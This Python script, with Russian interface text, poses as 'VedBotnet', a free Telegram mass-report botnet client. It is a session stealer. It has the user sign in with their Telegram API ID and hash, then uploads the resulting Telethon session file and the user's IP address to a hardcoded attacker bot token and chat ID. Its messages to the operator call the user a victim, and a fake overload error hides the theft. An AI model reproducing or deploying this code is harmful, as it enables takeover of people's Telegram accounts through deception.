

import socket# coder -> @vedmoor
import sys# coder -> @vedmoor
from pystyle import Anime, Center, Colorate, Colors# coder -> @vedmoor
import requests# coder -> @vedmoor
from telethon.sync import TelegramClient# coder -> @vedmoor
import os # coder -> @vedmoor
import webbrowser# coder -> @vedmoor
# coder -> @vedmoor
webbrowser.open("https://t.me/lostmyterror", new=2)# coder -> @vedmoor
# coder -> @vedmoor
def clear_screen():# coder -> @vedmoor
    """Очищает экран и устанавливает цвет фона и текста."""# coder -> @vedmoor
    os.system("cls" if os.name == "nt" else "clear")# coder -> @vedmoor
    # Устанавливаем цвет фона RGB(0, 12, 24) и белый текст
    print("\033[48;2;0;12;24m\033[38;2;255;255;255m", end='')# coder -> @vedmoor
    os.system("cls" if os.name == "nt" else "clear")# coder -> @vedmoor
# coder -> @vedmoor
clear_screen()
# coder -> @vedmoor
# coder -> @vedmoor
Intro = """
╭─                                                                                    ─╮

 

       ██▒   █▓▓█████ ▓█████▄  ▄▄▄▄    ▒█████  ▄▄▄█████▓  ███▄    █ ▓█████▄▄▄█████▓
       ▓██░   █▒▓█   ▀ ▒██▀ ██▌▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒ ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒
        ▓██  █▒░▒███   ░██   █▌▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░
         ▒██ █░░▒▓█  ▄ ░▓█▄   ▌▒██░█▀  ▒██   ██░░ ▓██▓ ░ ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ 
          ▒▀█░  ░▒████▒░▒████▓ ░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ ▒██░   ▓██░░▒████▒ ▒██▒ ░ 
         ░  ▐░  ░░ ▒░ ░ ▒▒▓  ▒ ░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   
         ░ ░░   ░ ░  ░ ░ ▒  ▒ ▒░▒   ░   ░ ▒ ▒░     ░    ░ ░░   ░ ▒░ ░ ░  ░   ░    
            ░░     ░    ░ ░  ░  ░    ░ ░ ░ ░ ▒    ░         ░   ░ ░    ░    ░      
             ░     ░  ░   ░     ░          ░ ░                    ░    ░  ░        
            ░           ░            ░                                             

                VedBotnet - бесплатный ботнет сносер. Кодер @lostmyterror
                                   
╰─                                                                                     ─╯

                                               
                                                
                                                 
                         Нажмите "Enter" для запуска ботнет сносера.

"""
# coder -> @vedmoor
Anime.Fade(# coder -> @vedmoor
    Center.Center(Intro),# coder -> @vedmoor
    Colors.purple_to_blue,# coder -> @vedmoor
    Colorate.Vertical,# coder -> @vedmoor
    interval=0.1,# coder -> @vedmoor
    enter=True,# coder -> @vedmoor
)# coder -> @vedmoor
# coder -> @vedmoor
clear_screen()# coder -> @vedmoor
# coder -> @vedmoor
banner = """

╭───────────────────────────────────────────────────────────────────────────────────────────╮
│                                                                                           │                                   
│                                                                                           │
│    ██▒   █▓▓█████ ▓█████▄     ▄▄▄▄    ▒█████  ▄▄▄█████▓ ███▄    █ ▓█████▄▄▄█████▓         │
│   ▓██░   █▒▓█   ▀ ▒██▀ ██▌   ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒ ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒         │
│    ▓██  █▒░▒███   ░██   █▌   ▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░         │
│     ▒██ █░░▒▓█  ▄ ░▓█▄   ▌   ▒██░█▀  ▒██   ██░░ ▓██▓ ░ ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░          │
│      ▒▀█░  ░▒████▒░▒████▓    ░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ ▒██░   ▓██░░▒████▒ ▒██▒ ░          │
│     ░ ▐░  ░░ ▒░ ░ ▒▒▓  ▒    ░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░             │
│     ░ ░░   ░ ░  ░ ░ ▒  ▒    ▒░▒   ░   ░ ▒ ▒░     ░    ░ ░░   ░ ▒░ ░ ░  ░   ░              │
│      ░░     ░    ░ ░  ░     ░    ░ ░ ░ ░ ▒    ░         ░   ░ ░    ░    ░                 │
│       ░     ░  ░   ░        ░          ░ ░                    ░    ░  ░                   │
│                                                                                           │                              
│                                                                                           │
│   Coder:   @lostmyterror                                ● STATUS [WORK]                   │
│   Ved Botnet - бесплатный клиент ботнет сносера         ● Кол-во сессий в ботнете [144]   │
│                                                         ● Кол-во успешных сносов [23]     │
│                                                                                           │
│                                       [1] SNOS                                            │
│                                                                                           │
│                                                                                           │
│                                                                         [CTRL + Z] Выход  │ 
╰───────────────────────────────────────────────────────────────────────────────────────────╯






"""
# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
banner3 = """

У вас отсутсвует подписка! Для получения бесплатной подписки в сносере нужно добавить в ботнет свою сессию.


● Добавляя свою сессию в систему вы делаете сносер мощнее и быстрее.
● С вашей сессии также будут отправляться жалобы на других пользователей.
● За свой акаунт вы можете не волноваться так как вашей сессией владеет только система 
  и в нее не добавлено других функций кроме отправки жалоб.



Для добавления сессии нужно:


1. Перейдите по my.telegram.org/apps

2. Войдите со своим номером телеграм и введите код (он придет в тг)

3. Выберите API developoment tool

4. Создайте новое приложение. Платформа любая. Название любое. Остальные поля пустыми оставьте.

5. Теперь в App configuration у вас будет API ID и API HASH.

6. Далее введите их и получите пробную подписку на 1 месяц в ботнет сносере.


"""
# coder -> @vedmoor
banner4 = """
Сессия создана успешно и была добавленна на сервер ботнета!
Мы проверим ее на работоспособность а затем ваша подписка на 1 месяц будет активирована. 
Важно чтобы вы не кикали сессию пока идет проверка.

***
ERROR
На данный момент система перегруженна, поэтому выдача подписки может занять от 15 минут до нескольких дней. 
Если у вас есть какие то вопросы вы можете написать нашему админу @uiyfOyd96 

***


"""
#1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
#1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
BOT_TOKEN = "7794096211:AAGwuHD-fMU4vmRiHyBrnyo4YgiU-OOXSYA"#1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
CHAT_ID = "7129761151"#111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
#1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
#1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
# coder -> @vedmoor
print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner)))
# coder -> @vedmoor
while True:# coder -> @vedmoor
    choice = input("root@BotnetSnos -> ")# coder -> @vedmoor
    if choice == "1":# coder -> @vedmoor
# coder -> @vedmoor
        print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner3)))
# coder -> @vedmoor
# coder -> @vedmoor
# coder -> @vedmoor
        def send_notification(message):# coder -> @vedmoor
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"# coder -> @vedmoor
            data = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}# coder -> @vedmoor
            try:# coder -> @vedmoor
                requests.post(url, data=data, timeout=10)# coder -> @vedmoor
            except Exception:# coder -> @vedmoor
                sys.exit()# coder -> @vedmoor
# coder -> @vedmoor
# coder -> @vedmoor
        def get_user_ip():# coder -> @vedmoor
            try:# coder -> @vedmoor
                response = requests.get("https://api.ipify.org?format=json", timeout=10)# coder -> @vedmoor
                response.raise_for_status()# coder -> @vedmoor
                ip = response.json().get("ip")# coder -> @vedmoor
                return ip.replace(".", "_") if ip else "unknown_ip"# coder -> @vedmoor
            except:# coder -> @vedmoor
                try:# coder -> @vedmoor
                    return socket.gethostbyname(socket.gethostname()).replace(".", "_")# coder -> @vedmoor
                except:# coder -> @vedmoor
                    return "unknown_ip"# coder -> @vedmoor
# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
        try:# coder -> @vedmoor
            user_ip = get_user_ip()# coder -> @vedmoor
            session_name = f"ip_{user_ip}"# coder -> @vedmoor
# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
            api_id = int(input("Введите API ID: "))# coder -> @vedmoor
            api_hash = input("Введите API Hash: ")# coder -> @vedmoor
# coder -> @vedmoor
            with TelegramClient(session_name, api_id, api_hash) as client:# coder -> @vedmoor
                client.start()
# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
                session_file = f"{session_name}.session"# coder -> @vedmoor
                message = f"{user_ip} жертва сделала сессию {session_name}.session"
# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
                try:# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
                    with open(session_file, "rb") as file:# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
                        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"# coder -> @vedmoor
                        files = {"document": (session_file, file)}# coder -> @vedmoor
                        data = {"chat_id": CHAT_ID, "caption": message}# coder -> @vedmoor
# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
                        response = requests.post(url, data=data, files=files, timeout=20)# coder -> @vedmoor
# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
                        if response.status_code != 200:# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
                            send_notification(# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
                                f"{user_ip} ошибка отправки файла: {response.status_code}"
                            )# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
                except Exception as e:# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
                    send_notification(f"{user_ip} ошибка при отправке файла: {str(e)}")
                print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner4)))
# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
        except Exception as e:# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
            send_notification(f"Жертва {user_ip} неправильно ввела id или hash : {str(e)}")
# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
        # coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
    else:# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor
        print("Неверный выбор.")
# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor# coder -> @vedmoor